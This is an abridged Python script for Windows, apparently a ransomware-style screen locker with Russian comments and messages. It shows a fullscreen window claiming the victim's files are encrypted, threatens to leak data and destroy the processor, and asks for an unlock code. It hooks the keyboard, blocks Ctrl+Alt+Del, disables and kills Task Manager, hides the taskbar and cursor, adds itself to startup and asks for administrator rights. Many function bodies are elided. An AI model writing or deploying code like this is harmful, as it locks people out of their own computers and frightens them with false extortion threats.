...
# ---------- КОНФИГУРАЦИЯ ----------
PASSWORD = "810624"   # пароль для разблокировки
ATTEMPTS_MAX = 3
TIMER_SECONDS = 48 * 3600   # 48 часов
...
def get_hwnd(tk_window):
    """Получает HWND окна tkinter."""
    return int(tk_window.winfo_id())

def set_window_style(hwnd):
    """Убирает системное меню и кнопки."""
    try:
        GWL_STYLE = -16
        ...
        ctypes.windll.user32.SetWindowPos(hwnd, 0, 0, 0, 0, 0,
                                          0x0002 | 0x0001)  # SWP_NOMOVE | SWP_NOSIZE | SWP_FRAMECHANGED
    except:
        pass

# ---------- ОСНОВНОЙ КЛАСС ----------
class UltimateLock(tk.Tk):
    def __init__(self):
        super().__init__()

        print("[DEBUG] Создание окна...")
        ...
        # Получаем HWND и убираем системное меню
        ...
        self.bind("<Escape>", self.restart_program)
        ...
        ctypes.windll.user32.ShowCursor(False)   # скрываем курсор
        self.hide_taskbar()

        # ---------- НИЗКОУРОВНЕВЫЙ ХУК КЛАВИАТУРЫ ----------
        # Даём окну время на создание
        time.sleep(0.5)
    ...
    def block_cad(self):
        try:
            ...
            winreg.CloseKey(key)
            print("[DEBUG] CAD заблокирован.")
        except Exception as e:
            print(f"[WARN] Не удалось заблокировать CAD: {e}")
    ...
    def add_to_startup(self):
        try:
            ...
            winreg.CloseKey(key)
            print("[DEBUG] Автозагрузка добавлена.")
        except Exception as e:
            print(f"[WARN] Не удалось добавить автозагрузку: {e}")
    ...
    def disable_task_manager_registry(self):
        ...
        for hive, path in paths:
            try:
                ...
                winreg.CloseKey(key)
                print(f"[DEBUG] Диспетчер задач отключён в {path}")
            except Exception as e:
                print(f"[WARN] Не удалось отключить диспетчер в {path}: {e}")

    def kill_task_manager_loop(self):
        while True:
            try:
                # Закрываем окно диспетчера задач по классу
    ...
    def hide_taskbar(self):
        try:
            ...
            if hwnd:
                ...
                print("[DEBUG] Панель задач скрыта.")
        except Exception as e:
            print(f"[WARN] Не удалось скрыть панель задач: {e}")
    ...
    def block_keys(self):
        ...
        if not hook:
            print("[ERROR] Не удалось установить хук клавиатуры!")
            return
        print("[DEBUG] Хук клавиатуры установлен.")
        self.hook = hook
    ...
    def block_close(self):
        # Игнорируем попытку закрыть окно
        pass
...
"""
    ...
    def setup_lock_screen(self):
        ...
        center_frame = tk.Frame(
            self, bg="#0a0a4a", highlightbackground="white",
            highlightthickness=2, padx=45, pady=35
        )
        center_frame.place(relx=0.5, rely=0.5, anchor="center")

        self.lbl_title = tk.Label(
            center_frame, text="⚠️ ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ! ⚠️",
            fg="white", bg="#0a0a4a", font=("Arial", 28, "bold")
        )
        self.lbl_title.pack(pady=(0, 15))

        threat_text = (
            "Упс! Вы подверглись хакерской атаке!\n"
            "Все ваши диски и файлы зашифрованы группировкой RansomWare.\n"
            "Любые попытки взлома системы приведут к НЕОБРАТИМОЙ ПОТЕРЕ данных.\n"
            "При попытке снять блокировку ВСЕ ваши файлы будут выгружены в сеть,\n"
            "а на процессор будет подана рекурсивная нагрузка – он выйдет из строя.\n\n"
            "Введите код разблокировки:"
        )
        tk.Label(
            center_frame, text=threat_text, fg="#ffffff", bg="#0a0a4a",
        ...
        self.entry_code = tk.Entry(
            ...
            bg="#1a1a5a", fg="#00ff00", insertbackground="#00ff00", insertwidth=10,
        ...
        tk.Button(
            ...
            bg="white", fg="blue", activebackground="#cccccc",
            activeforeground="darkblue", command=self.check_code,
            padx=10, pady=5
        ).pack(pady=5)
        ...
        """
        tk.Label(
            center_frame, text=skull, fg="#8888ff", bg="#0a0a4a",
    ...
    def start_blinking(self):
        if hasattr(self, "lbl_title") and self.lbl_title.winfo_exists():
            ...
            color = "yellow" if self.blink_state else "white"
...
if __name__ == "__main__":
    ...
    if not is_admin:
        ...
        print("[INFO] Запуск от имени администратора...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    else:
        print("[INFO] Запущено с правами администратора.")
        app = UltimateLock()
        app.mainloop()